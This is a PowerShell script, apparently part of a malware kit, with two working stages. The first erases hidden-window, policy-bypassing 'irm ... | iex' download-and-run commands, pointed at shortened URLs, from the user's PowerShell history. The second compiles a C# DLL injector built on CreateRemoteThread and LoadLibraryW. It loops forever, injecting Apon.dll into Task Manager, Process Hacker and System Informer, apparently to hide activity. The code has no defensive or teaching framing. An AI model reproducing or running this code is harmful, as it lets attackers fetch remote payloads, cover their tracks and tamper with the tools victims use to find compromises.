# -------------------------------
# 1) Clean PowerShell history
# -------------------------------

$historyFile = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"

$blockedCommands = @(
    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/CursedCoreHidden | iex"',
    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex"',
    'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/to9Mg | iex"',
    'powershell -windowstyle hidden -ep bypass -c "irm https://shorturl.at/YFedx | iex"',
    'powershell -windowstyle hidden -ep bypass -c "irm https://tinyurl.com/cursedcorehack | iex; irm https://tinyurl.com/CursedCoreHidden | iex"'
    'powershell -ep bypass -c "irm https://tinyurl.com/CursedCoreSetup | iex"'
)

if (Test-Path $historyFile) {
    $history = Get-Content $historyFile

    $filtered = $history | Where-Object {
        $keep = $true
        foreach ($cmd in $blockedCommands) {
            if ($_ -like "*$cmd*") {
                $keep = $false
                break
            }
        }
        return $keep
    }

    Set-Content $historyFile -Value $filtered -Encoding UTF8
    Write-Host "[+] PowerShell history cleaned." -ForegroundColor Green
} else {
    Write-Host "[-] History file not found at $historyFile" -ForegroundColor Yellow
}

# -------------------------------
# 2) DLL Injector Loop
# -------------------------------

$dllFolder = "C:\Windows\System32"
$dll1 = "Apon.dll"
$dll1Path = Join-Path $dllFolder $dll1
$targetProcesses = @("Taskmgr", "ProcessHacker", "SystemInformer")
$injectedPIDs = @{}

$injectorCode = @"
using System;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, uint size, out UIntPtr written);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    public const int PROCESS_CREATE_THREAD = 0x0002;
    public const int PROCESS_QUERY_INFORMATION = 0x0400;
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const int PROCESS_VM_READ = 0x0010;

    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_READWRITE = 0x04;

    public static bool Inject(int pid, string dllPath)
    {
        IntPtr hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, pid);
        if (hProcess == IntPtr.Zero)
            return false;

        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))),
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (allocMemAddress == IntPtr.Zero)
            return false;

        byte[] bytes = Encoding.Unicode.GetBytes(dllPath);
        UIntPtr bytesWritten;
        bool result = WriteProcessMemory(hProcess, allocMemAddress, bytes, (uint)bytes.Length, out bytesWritten);
        if (!result || bytesWritten.ToUInt32() != bytes.Length)
            return false;

        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
        IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");
        if (loadLibraryAddr == IntPtr.Zero)
            return false;

        IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
        if (remoteThread == IntPtr.Zero)
            return false;

        CloseHandle(hProcess);
        return true;
    }
}
"@

Add-Type -TypeDefinition $injectorCode -Language CSharp

Write-Output "Monitoring processes: $($targetProcesses -join ', ')..."

while ($true) {
    foreach ($processName in $targetProcesses) {
        $procs = Get-Process -Name $processName -ErrorAction SilentlyContinue
        foreach ($proc in $procs) {
            if (-not $injectedPIDs.ContainsKey($proc.Id)) {
                Write-Output "Injecting into $processName"
                $success = [Injector]::Inject($proc.Id, $dll1Path)
                if ($success) {
                    Write-Host "[+] Done" -ForegroundColor Green
                    $injectedPIDs[$proc.Id] = $true
                } else {
                    Write-Warning "Failed to inject" -ForegroundColor Red
                }
            }
        }
    }

        # Remove exited processes from tracking
        foreach ($procId in @($injectedPIDs.Keys)) {
            if (-not (Get-Process -Id $procId -ErrorAction SilentlyContinue)) {
                $injectedPIDs.Remove($procId)
                Write-Output "Process with PID $procId has exited. Monitoring again."
            }
        }


    Start-Sleep -Seconds 1
}
